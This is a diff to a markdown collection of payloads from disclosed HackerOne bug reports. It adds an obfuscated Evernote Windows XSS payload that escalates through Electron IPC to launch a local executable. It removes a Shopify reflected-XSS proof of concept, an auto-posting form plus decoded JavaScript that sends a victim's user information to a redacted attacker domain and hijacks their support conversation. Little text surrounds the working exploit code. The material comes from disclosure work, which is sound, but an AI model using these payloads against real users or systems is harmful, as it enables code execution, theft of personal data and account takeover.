@@ -1165,6 +1165,17 @@ GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
 Git:		/opt/gitlab/embedded/bin/git
 ```
 
+## #2119149 Evernote(WindowsApp) XSS to RCE — evernote — $2,000 — Code Injection
+Source: `hackerone/reports/2026/2119149.md` (https://hackerone.com/reports/2119149)
+
+```
+&quot;&gt;&lt;img src onerror=eval(atob(&apos;c2V0VGltZW91dCgoKT0+e3dpbmRvdy5lbGVjdHJvbkFwaS5pcGNSZW5kZXJlci5zZW5kKCJCcm9rZXJCcmlkZ2UiLHthY3Rpb246IkJyaWRnZS9QdWJsaXNoIix0b3BpY3M6ImJvcm9uLmFjdGlvbnMub3BlbkJyb3dzZXJXaW5kb3ciLHR5cGU6IiIsZGF0YTp7InJlcXVpcmVzQXV0aGVudGljYXRpb24iOmZhbHNlLCJ1cmwiOiJmaWxlOi8vL0M6L1dpbmRvd3MvU3lzdGVtMzIvY2FsYy5leGUifX0pO30sNTAwMCk7&apos;))&gt;
+```
+
+```
+setTimeout(()=>{window.electronApi.ipcRenderer.send("BrokerBridge",{action:"Bridge/Publish",topics:"boron.actions.openBrowserWindow",type:"",data:{"requiresAuthentication":false,"url":"file:///C:/Windows/System32/calc.exe"}});},5000);
+```
+
 ## #846905 Stored XSS in Elastic App Search — elastic — $2,000 — Cross-site Scripting (XSS) - Stored
 Source: `hackerone/reports/2020/846905.md` (https://hackerone.com/reports/846905)
 
@@ -1231,60 +1242,5 @@ https://bootstrap.controlled-domain/api/v3.0/content/thread/?collection_id=GET+p
     }
   }
 }
-```
-
-## #2509022 Reflected XSS in AI Chat Bot Greetings at help.shopify.com via Markdown Image Rendering — shopify — $1,600 — Cross-site Scripting (XSS) - Reflected
-Source: `hackerone/reports/2026/2509022.md` (https://hackerone.com/reports/2509022)
-
-```
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shopify Search Form</title>
-</head>
-<body>
-    Please hold...
-    
-    <form id="post-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">
-        <input type="hidden" name="query" value="Is this XSS?">
-        <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...](javascript:eval(atob('ZmV0Y2goYC8v████████/JHtKU09OLnN0cmluZ2lmeSh3aW5kb3cuX19yZW1peENvbnRleHQuc3RhdGUubG9hZGVyRGF0YS5yb290LnVzZXJJbmZvKX1gKTsgZmV0Y2goIi9tZXNzYWdlcy9ncmFwaHFsIiwgeyAiaGVhZGVycyI6IHsgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIngtc2hvcGlmeS1yZWFjdC14aHIiOiAiMSIgfSwgImJvZHkiOiBgeyJ2YXJpYWJsZXMiOnt9LCJxdWVyeSI6InF1ZXJ5IGNvbnZzIHsgY29udmVyc2F0aW9ucyhmaXJzdDogMTAwKSB7IGVkZ2VzIHsgbm9kZSB7IGlkIH0gfSB9IH0ifWAsICJtZXRob2QiOiAiUE9TVCIgfSkgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKSAudGhlbihkYXRhID0+IHsgY29uc3QgY2lkID0gSlNPTi5wYXJzZShkYXRhKS5kYXRhLmNvbnZlcnNhdGlvbnMuZWRnZXNbMF0ubm9kZS5pZCA/PyBudWxsOyBmZXRjaCgiL21lc3NhZ2VzL2dyYXBocWwiLCB7ICJoZWFkZXJzIjogeyAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAieC1zaG9waWZ5LXJlYWN0LXhociI6ICIxIiB9LCAiYm9keSI6IGB7InZhcmlhYmxlcyI6e30sInF1ZXJ5IjoibXV0YXRpb24gc3Vic2NyaWJlckNyZWF0ZSB7IHN1YnNjcmliZXJDcmVhdGUoY29udmVyc2F0aW9uSWQ6IFxcIiR7Y2lkfVxcIiwgZW1haWw6IFxcInNhbHR5bWVybWFpZEB3ZWFyZWhhY2tlcm9uZS5jb21cXCIpIHsgX190eXBlbmFtZSB9fSJ9YCwg
-```
-
-```
-// At worst, if no support conversation exists, we leak victims' PII to attacker's controlled domain
-fetch(`//████████?${JSON.stringify(window.__remixContext.state.loaderData.root.userInfo)}`);
-
-// Fetch victim's last support inbox conversation.
-fetch("/messages/graphql", {
-  "headers": {
-	"content-type": "application/json",
-	"x-shopify-react-xhr": "1"
-  },
-  "body": `{\"variables\":{},\"query\":\"query convs { conversations(last: 1) { edges { node { id } } } }\"}`,
-  "method": "POST"
-})
-.then(response => response.text())
-.then(data => {
-
-   // Try to subscribe to the victim's conversation which will send an email to the attacker and allow him to join the conversation
-	const cid = JSON.parse(data).data.conversations.edges[0].node.id ?? null;
-	fetch("/messages/graphql", {
-	  "headers": {
-		"content-type": "application/json",
-		"x-shopify-react-xhr": "1"
-	  },
-	  "body": `{\"variables\":{},\"query\":\"mutation subscriberCreate { subscriberCreate(conversationId: \\\\"${cid}\\\\", email: \\\\"saltymermaid@wearehackerone.com\\\\") { __typename }}\"}`,
-	  "method": "POST"
-	});
-
-});
-```
-
-```
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shopify Search Form</title>
 ```
 
